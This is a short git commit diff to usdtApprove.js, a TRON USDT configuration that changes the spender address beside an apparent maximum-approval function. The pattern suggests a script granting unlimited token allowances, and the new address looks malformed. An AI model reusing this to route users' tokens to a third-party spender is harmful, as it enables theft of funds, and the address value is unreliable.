604f616e100a4fd4fdc96492dee7efe08d154f95
Paynow7 <khahan_13613@hotmail.com>
2025-10-11 21:01:04 +0800

    Update usdtApprove.js

--- usdtApprove.js
+++ usdtApprove.js
@@ -2,7 +2,7 @@
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
-const spenderAddress = "TTqCn1whizbpg1o5EfHW9MUjGiKrX7ScRG";
+const spenderAddress = "TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC";
 
 // ====== 最大授权额度 ======
 function getLargeEnoughAmount() {
